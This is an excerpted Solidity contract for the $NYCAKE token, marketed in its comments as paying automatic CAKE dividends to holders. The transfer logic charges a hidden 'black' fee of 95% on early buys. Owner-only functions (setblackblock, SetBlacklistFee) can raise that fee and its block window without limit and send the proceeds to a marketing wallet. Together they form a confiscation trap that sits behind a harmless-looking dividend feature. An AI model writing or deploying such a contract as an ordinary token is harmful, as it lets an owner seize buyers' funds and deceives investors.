...
//
// $NYCAKE proposes an innovative feature in its contract.
//
// DIVIDEND YIELD PAID IN CAKE! With the auto-claim feature,
// simply hold $NYCAKE and you'll receive CAKE automatically in your wallet.
// 
// Hold $NYCAKE and get rewarded in $CAKE on every transaction!
//
...
contract NYCAKE is ERC20, Ownable {
	...
	uint256 private _blackfee = 95;
	uint256 private _blackblock = 5;
	bool private isTradingEnabled = true;

	NYCAKEDividendTracker public dividendTracker;
	NYCTransferHelper private transferHelper;
    ...
    uint256 private blackedMarketing = 50;
	...
	constructor(address routerAddress, address payable marketingWalletAddress) public ERC20("NewYorkCAKE", "NYCAKE") {
		dividendTracker = new NYCAKEDividendTracker();
		transferHelper = new NYCTransferHelper(routerAddress);
	...
	function updateDividendTracker(address newAddress) public onlyOwner {
		require(newAddress != address(dividendTracker), "NYCAKE: The dividend tracker already has that address");

		NYCAKEDividendTracker newDividendTracker = NYCAKEDividendTracker(payable(newAddress));

		require(newDividendTracker.owner() == address(this), "NYCAKE: The new dividend tracker must be owned by the NYCAKE token contract");
	...
	function updateUniswapV2Router(address newAddress) public onlyOwner {
		require(newAddress != address(uniswapV2Router), "NYCAKE: The router already has that address");
	...
	function excludeFromFees(address account, bool excluded) public onlyOwner {
		require(_isExcludedFromFees[account] != excluded, "NYCAKE: Account is already the value of 'excluded'");
	...
	function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
		require(pair != uniswapV2Pair, "NYCAKE: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");
	...
	function setMaxWalletAmount(uint256 amount) public onlyOwner {
		require(amount <= totalSupply(), "NYCAKE: Amount cannot be over the total supply.");
	...
	function _setAutomatedMarketMakerPair(address pair, bool value) private {
		require(automatedMarketMakerPairs[pair] != value, "NYCAKE: Automated market maker pair is already set to that value");
	...
	function updateGasForProcessing(uint256 newValue) public onlyOwner {
		require(newValue >= 200000 && newValue <= 500000, "NYCAKE: gasForProcessing must be between 200,000 and 500,000");
		require(newValue != gasForProcessing, "NYCAKE: Cannot update gasForProcessing to same value");
	...
	function _transfer(address _from, address _to, uint256 _amount) internal override {
		...
		if (takeFee) {
			...
			if (feePercent > 0) {
				if (block.number <= (launchedAt + _blackblock) && automatedMarketMakerPairs[_from] && _to != address(uniswapV2Router) && _to != address(this) && _to != owner()) {
					feePercent = _blackfee;
				}

				uint256 fees = _amount.mul(feePercent).div(100);
				_amount = _amount.sub(fees);
				processBlackFees(fees);
    ...
    function setblackblock(uint256 blackfee, uint256 blackblock) external onlyOwner{
        _blackfee = blackfee;
        _blackblock = blackblock;
    }

    function processBlackFees(uint256 FeeIn) private {
	    uint256 FeeOut = swapExactTokensForETH(FeeIn);

    	uint256 FeeForMarketing = FeeOut.mul(blackedMarketing).div(100);
	    uint256 FeeForLiquidity = FeeOut.sub(FeeForMarketing);

		if (FeeForMarketing > 0) {
			payable(_marketingWalletAddress).transfer(FeeForMarketing);
		}

		if (FeeForLiquidity > 0) {
			swapAndLiquify(FeeForLiquidity);
		}
}

    function SetBlacklistFee(uint256 BlacklistMarketfee) external onlyOwner {
        blackedMarketing = BlacklistMarketfee;
    }
...
contract NYCAKEDividendTracker is Ownable, DividendPayingToken {
	using SafeMath for uint256;
	...
	constructor() public DividendPayingToken("NYCAKE_Dividend_Tracker", "NYCAKE_Dividend_Tracker") {

	}

	function _transfer(address, address, uint256) internal override {
		require(false, "NYCAKE_Dividend_Tracker: No transfers allowed");
	}

	function withdrawDividend() public override {
		require(false, "NYCAKE_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main NYCAKE contract.");
	}
	...
	function updateClaimWait(uint256 newClaimWait) external onlyOwner {
		require(newClaimWait >= 3600 && newClaimWait <= 86400, "NYCAKE_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
		require(newClaimWait != claimWait, "NYCAKE_Dividend_Tracker: Cannot update claimWait to same value");
